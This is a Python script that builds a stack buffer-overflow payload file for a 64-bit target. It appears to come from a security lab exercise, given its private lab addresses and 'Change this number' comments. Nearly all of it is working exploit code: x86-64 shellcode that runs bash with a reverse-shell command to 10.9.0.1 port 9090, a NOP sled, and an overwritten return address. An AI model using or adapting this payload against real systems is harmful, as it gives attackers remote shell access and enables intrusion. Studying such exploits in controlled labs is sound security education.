#!/usr/bin/python3
import sys

# 64 bytes shellcode
shellcode = (
  "\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"
  "\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"
  "\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"
  "\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"
  "/bin/bash*"
  "-c*"
  "/bin/bash -i >/dev/tcp/10.9.0.1/9090 0<&1 2>&1              *"
  "AAAAAAAA"   # Placeholder for argv[0] --> "/bin/bash"
  "BBBBBBBB"   # Placeholder for argv[1] --> "-c"
  "CCCCCCCC"   # Placeholder for argv[2] --> the command string
  "DDDDDDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')

# server-3-10.9.0.7 | Frame Pointer (rbp) inside bof():  0x00007fffffffe440
# server-3-10.9.0.7 | Buffer's address inside bof():     0x00007fffffffe370


# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
# Put the shellcode somewhere in the payload
start = 0            # Change this number 
content[start:start + len(shellcode)] = shellcode
# I can put the shellcode at the beginning of the payload
# and than the return address point to the shellcode, i.e. buffer start address

# Decide the return address value 
# and put it somewhere in the payload
ret    = 0x00007fffffffe370     # Change this number 
offset = 0xD0 + 8       # Change this number 

# Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + 8] = (ret).to_bytes(8,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
